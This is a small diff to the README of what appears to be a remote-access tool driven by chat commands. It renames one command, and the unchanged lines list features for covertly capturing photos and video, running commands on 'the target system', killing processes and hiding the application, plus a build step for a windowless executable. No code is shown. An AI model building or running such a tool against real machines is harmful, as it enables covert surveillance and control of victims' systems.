@@ -41,7 +41,7 @@ pyinstaller filename --one-file --window
 !stopstream: Stops capturing real-time photos.
 !video (second): Records video for a specified duration.
 !command (command): Executes a command on the target system.
-!gofile (folder name): Changes directory to the specified folder.
+!cd (folder name): Changes directory to the specified folder.
 !kill (process): Terminates a specified task.
 !hide: Hides the application.
 !setlang (lang code): Sets the language before using !say.
